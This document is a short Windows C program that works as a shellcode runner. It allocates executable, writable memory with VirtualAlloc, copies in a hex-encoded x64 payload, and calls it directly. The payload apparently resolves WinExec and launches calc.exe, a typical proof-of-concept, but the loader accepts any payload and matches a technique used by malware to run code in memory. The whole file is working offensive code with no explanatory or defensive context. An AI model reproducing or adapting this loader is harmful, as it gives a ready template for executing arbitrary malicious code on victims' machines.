#include <stdio.h>
#include <windows.h>

int main() {
	printf("preparing to execute shellcode\n");

	unsigned char buf[] = "\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b\x40\x18\x48\x8b\x70\x20\x48\xad\x48\x96\x48\xad\x48\x8b\x58\x20\x49\x89\xd8\x48\x31\xdb\x49\x8b\x50\x3c\x4c\x01\xc2\x48\x8b\x52\x78\x4c\x01\xc2\x4c\x8b\x52\x20\x4c\x01\xc6\x4d\x31\xc9\x4c\x8b\x4a\x14\x48\x31\xc9\x68\x57\x69\x6e\x45\x58\x48\x31\xdb\x49\x8b\x5c\x8a\x04\x48\xff\xc1\x48\x39\x03\x75\xf0\x45\x4d\x31\xdb\x4c\x8b\x5a\x24\x4d\x01\xc3\x4d\x8b\x24\x4b\x4d\x31\xdb\x4c\x8b\x5a\x1c\x4d\x01\xc3\x4b\x8b\x0c\xeb\x4c\x01\xc1\x49\x89\xc9\x48\x31\xc0\x50\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\x48\x31\xd2\x48\xff\xc2\x41\xff\xd1";

	void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, buf, sizeof(buf));
	((void(*)())exec)();

	printf("shellcode executed!\n");
	return 0;
}
